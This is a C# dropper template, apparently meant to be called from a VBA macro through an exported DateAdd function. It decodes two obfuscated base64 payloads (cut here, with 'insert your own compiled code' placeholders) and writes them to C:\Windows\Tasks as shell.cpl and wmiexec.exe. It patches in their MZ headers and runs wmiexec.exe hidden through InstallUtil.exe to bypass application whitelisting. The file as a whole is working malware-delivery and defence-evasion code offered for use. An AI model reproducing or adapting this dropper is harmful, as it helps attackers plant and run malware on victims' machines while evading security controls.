using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;

namespace Code
{

public class Program
{
  // the function name exported with .export [1] DateAdd is called from VBA macro
	public static int DateAdd()
	{

      // shell.cpl payload - insert your own compiled code
      string FileStr0 =  "uXuQAAMAAAAEA!AAA## --- CUT ---AA!!=!=!";

      // wmiexec.exe payload  - insert your own compiled code
      string FileStr1 =
      "EZqQAAMAAAAEA --- CUT --- AAAAAAAA!!=!";

      // replace # with / and ! with
      string buffer = FileStr0.Replace("#", "/");
      buffer = buffer.Replace("!", "");
      Byte[] Fbytes0 = Convert.FromBase64String(buffer);
      File.WriteAllBytes("C:\\Windows\\Tasks\\shell.cpl", Fbytes0);
      // replace # with / and ! with
      buffer = FileStr1.Replace("#", "/");
      buffer = buffer.Replace("!", "");
      Byte[] Fbytes1 = Convert.FromBase64String(buffer);
      File.WriteAllBytes("C:\\Windows\\Tasks\\wmiexec.exe", Fbytes1);

      // replace the first two bytes with MZ
      byte [] buf = new byte [] {0x4d, 0x5a};

      Stream stream = File.Open("C:\\Windows\\Tasks\\shell.cpl", FileMode.Open);
      stream.Position = 0;
      stream.Write(buf, 0, buf.Length);
      stream.Dispose();
      stream = File.Open("C:\\Windows\\Tasks\\wmiexec.exe", FileMode.Open);
      stream.Position = 0;
      stream.Write(buf, 0, buf.Length);
      stream.Dispose();

      //System.Windows.Forms.MessageBox.Show("Hello from C#");

      // start InstallUtil.exe that execute our payload wmiexec.exe
      Process cmd = new Process();
      cmd.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe";
      cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
      cmd.StartInfo.Arguments = @"/logfile= /LogToConsole=false /U C:\Windows\Tasks\wmiexec.exe";
      cmd.Start();
			return 0;
	}
}
}
